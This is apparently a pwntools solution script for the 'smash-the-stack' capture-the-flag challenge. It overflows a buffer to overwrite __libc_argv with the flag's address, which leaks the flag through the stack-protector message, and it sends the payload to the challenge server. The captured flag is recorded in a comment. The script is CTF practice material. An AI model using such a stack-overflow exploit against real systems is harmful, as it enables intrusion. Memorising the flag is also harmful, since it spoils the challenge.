from pwn import *
import os
print os.chdir('/home/zander/Desktop/ctf')
context(arch = 'i386', os = 'linux', log_level = 'debug')

__libc_argv_addr = 0xffffd074
read_buf_addr = 0xffffcfb8
flag_addr = 0x804a060

payload = 'a' * (__libc_argv_addr - read_buf_addr)
payload += p32(flag_addr)

# p = process('/home/zander/Desktop/ctf/smash-the-stack')
p = remote('hackme.inndy.tw', 7717)
p.recvuntil('Try to read the flag\n')
p.sendline(payload)
p.recvall()
p.close()

# b *0x08048427
# b *0x080484DF push ecx ; ubp_av

# FLAG{Smash the stack, leaks the flag!}